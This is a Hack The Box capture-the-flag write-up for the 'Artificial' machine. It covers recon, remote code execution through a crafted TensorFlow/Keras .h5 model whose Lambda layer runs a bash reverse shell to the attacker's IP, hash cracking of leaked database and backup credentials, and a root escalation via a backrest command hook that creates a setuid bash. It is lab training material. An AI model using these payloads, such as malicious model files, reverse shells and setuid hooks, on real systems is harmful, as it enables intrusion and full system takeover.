---
tags:
  - Linux
  - HTTP
  - Insecure File Upload
  - Python
  - localhost service
---

... is a easy HTB machine which allows users to upload `ML` models via an `http` service in the format `.h5`. These `ML` models can also store `python Lambda` methods which get executed, resulting in RCE! For the privilege escalation, the system user is allowed to read a `backup` file for a web service, leaking it's credentials. The back-end allows you to execute arbitrary system commands as `root`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
This is a very typical setup of a web-vulnerability type CTF, where the `http` allows you to execute remote code on the machine, to allow you to find credentials for `ssh`. The output of the `http-title` `nmap` script tells us that the domain name `artificial.htb` is present. To quickly edit the `/etc/hosts` file for local DNS name resolution without a public DNS server, the following command appends an entry to that file:
```bash
echo "$IP artificial.htb" | sudo tee --append /etc/hosts
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# echo "...": writes the specified string into STDOUT (terminal)
# | : redirect (pipe) the STDOUT of the left command into the STDIN of the right command
# sudo tee --append /etc/hosts: write the received STDIN into a file without overwriting it. requires sudo, as that file is critical to the system  
```

After visiting `http://artificial.htb`, i see a for an AI-deployment and testing page. The title page seems to indicate that i can upload python code for AI-model training and -testing (also gives me some example code). The `view-source` of the landing page reveals the following endpoints after filtering for them:

- `/login`
- `/register`

Before accessing these endpoints, i use `ffuf` to employ forceful browsing to find possible hidden endpoints using this command:
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u "http://artificial.htb/FUZZ" -fs 207 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -u: URL of the target. the FUZZ word gets replaced with each entry of the wordlist.
# -fs: filter by response size, as all responses with 207 are "404" errors.
# -mc: accept any response code
```

This has also revealed `/dashboard` and `/logout`, which are presumably accessible after logging in or creating an account.

Due to this, i decided to also do some `VHost` fuzzing using the `subdomains-top1million-110000.txt` from `SecLists/Discovery/DNS/`:
```bash
ffuf -w ./subdomains-top1million-110000.txt -H "Host: FUZZ.artificial.htb" -u http://artificial.htb -fs 154 -mc all
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -w: specify wordlist file
# -H: add specific header. Here, the header "FUZZ.artificial.htb" is chosen. the FUZZ word is replaced by each entry of the wordlist!
# -u: URL of the target
# -fs: filter by response size
# -mc: accept any response code
```

This did not find any additional `VHost`'s!

### Initial Exploitation
I went back to the `artificial.htb` page to view what the back-end has to offer after creating an account with the credentials `attacker:password`. The back-end allows me to upload a `.h5` file, which is used to store massive amounts of numerical data (ML-models). Researching this file extension tells me that `.h5` files can store custom objects and `Lambda` (small anonymous functions) code. This in turn leads to `RCE` if a `.h5` file is executed by the server.

Thanks to [Splinter0's Github](https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py), i find the very simple `PoC` which creates an empty sequential model (very simple ML model) using `tensorflow.keras.Sequential()`, and attaches a custom method as a `Lambda` layer. If this custom model were to be loaded by the server, it would execute the custom `Lambda`:
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("ping -c 3 <my-IP>")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```
I decided to change the payload to 3 `pings` which reach my machine to verify if the code even gets executed. To build an `ML model` with the exact requirements the server needs, i simply use the provided `Dockerfile` to build the docker image and instantly execute my `exploit.py`:
```bash
sudo docker build -t tensor . && sudo docker run --rm -v "$PWD:/code" --entrypoint python tensor exploit.py
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# docker build: creates an docker image from a dockerfile
# -t: gives it a tag (name), which i can use to reference it
# .: use the Dockerfile in the current directory
# docker run: starts a container from an image
# --rm: deletes it if it already exists
# -v "$PWD:/code": mount my current directory to the `/code` directory within the docker, so it can access `exploit.py`
# --entrypoint python: overrides the entrypoint `/bin/bash`, so that `python` gets executed instead
# tensor: specify the tag of the image to use it
# exploit.py: argument passed to `python`. makes it execute my script using the custom python from the dockerfile
```

When listening for `ping` packages with `sudo tcpdump -i tun0 icmp`, uploading the resulting `exploit.h5` and rendering it, i receive `ping`'s from the server, meaning my custom code got executed!

Knowing this, i changed the `ping` payload to this reverse shell initiator:
```python
#...
os.system("bash -c '/bin/bash -i >& /dev/tcp/<my-IP>/1337 0>&1'")
#...
```
... and i rerun the `docker` command to give me the renewed `exploit.h5`. I start listening for incoming reverse shells using `nc`:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

... and i upload and render the new `exploit.h5`, which gives me a reverse shell as the service account `app`!

### Lateral Movement
As the user `app` is only a service account, it has very limited capabilities on the system. An actual user account within the `/home` directory is much more preferable.
The user `gael` has a home directory, which is why i assumed that i need his account to gain `ssh` access to the machine. `ssh` access is always better than a reverse shell, as it is fully interactive. It is always possible to upgrade the reverse shell with a [neat trick](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/), but `ssh` access to an actual account is always preferable.

Closely inspecting the `app.py` used for the `http` service, i notice the following:
```python
app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"
```
Sadly, this key does not give me `ssh` access to `gael` or `app`. That is why i further inspected the `sqlite3` database located in `/instance/users.db` using the following command (it lists the tables):
```bash
sqlite3 users.db ".tables"
```
And then i dump the `user` table using the following command:
```bash
sqlite3 users.db "select * from user;"
```
This gives me the hashes to the accounts `gael`, `mark`, `robert`, `royer` and `mary`. As these hashes look a lot like `MD5` hashes, i quickly input `gael's` hash into the [CrackStation](https://crackstation.net/) to find out if it is stored as clear-text there. And indeed, i receive the password `mattp005numbertwo`, which i use for `gael's` `ssh` access!

### Privilege Escalation
I try the three main privilege escalation vectors:

- `sudo -l`: mis-configured `sudoer` file
- `netstat -tulnp`: hidden services only accessible via localhost
- `id`: user belonging to a weird group

The command `id` shows that `gael` is part of the `sysadm` group. Googling it did not reveal any info, so i searched for files which belong to this group:
```bash
find / -group sysadm 2>/dev/null
```
This showed me the file `/var/backups/backrest_backup.tar.gz`. Using `ls -la` on it, reveals that `root` can `read,write` it, and users of the group `sysadm` can `read` it. I copy that file to `gael`s home directory and unzip it with `tar -xvf backrest_backup.tar.gz`. Within that, i find the file `backrest/.config/backrest/config.json` which reveals the username `backrest_root` with a `bcrypt`-hashed password. It did not look like a `bcrypt` hash though (Not in format `$version$cost$salt,hash`), it looked more like `base64`. I used `echo "<that-hash>" | base64 -d` to reveal the true hash! I save it in a `hash.txt` file.

The `hashid hash.txt` reveals the `blowfish(openbsd)` hash, which correlates to mode `3200` of `hashcat`:
```bash
hashcat -m 3200 ./hash.txt ./rockyou.txt
```
This reveals the true credentials to the `backrest` login `backrest_root:!@#$%^`!

As i didn't know where this `backrest` service was running, i googled for it, and i found out that it's default port is `9898`. A quick `netstat -tulnp` reveals that this port is actually listening on localhost. Sadly, `ps aux` did not reveal if this port was opened by `root`. I still decided to investigate it by using `ssh`'s local port forwarding during the login:
```bash
ssh -L 1337:localhost:9898 gael@$IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# 1337: port on our machine which gets opened. If talked to, ssh will forward it to the target port. can be any port.
# localhost: the remote host we want to reach. NOT $IP, as we want to be localhost (127.0.0.1) on the target.
# 9898: the remote port which gets interacted with when interacting with port 1337 on the local machine.
```

Visiting `http://localhost:1337` now gives me the backrest login prompt, where i enter the credentials `backrest_root:!@#$%^` and log in! On there, i can add `Plans` or `Repositories`. `Repositories` are locations where backups from `backrest` are stored. A `Plan` is like an execution model what gets backed up and when.

I configured a `Repository` named `test`, and gave it the file system location `/home/gael/test`. Additionally, under `Hooks`, i add a `Command` hook which executes the following OS-command if the condition `CONDITION_PRUNE_START` is met:
```bash
cp /bin/bash /home/gael/rootme; chmod u+s /home/gael/rootme
```
If this command were to be executed by `root`, i receive the binary `rootme` in `gaels` home directory, which starts a new `bash` as `root`!

I try to execute this command by pressing the `Prune Now` button on my custom repository. And voila, i receive an `rootme`, which elevates me to `root` when executing it using `./rootme -p`!

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|File<br>upload| B[.h5<br>File];
  B -->|Lambda| C[Python-code<br>execution];

  D[Python-code<br>execution] -->|read| E[SQLite3<br>database];
  E -->|Hash<br>cracking| F[SSH<br>Access];
```

The privilege escalation to the user `root` worked as follows:

``` mermaid
graph LR
  A[SSH<br>Access] -->|Read<br>permission| B[Backup<br>File];
  B -->|Hash<br>cracking| C[localhost<br>application];
  A -->|Port<br>forwarding| C[localhost<br>application];
  C -->|intended<br>functionality| D[Command<br>execution<br>as root];
```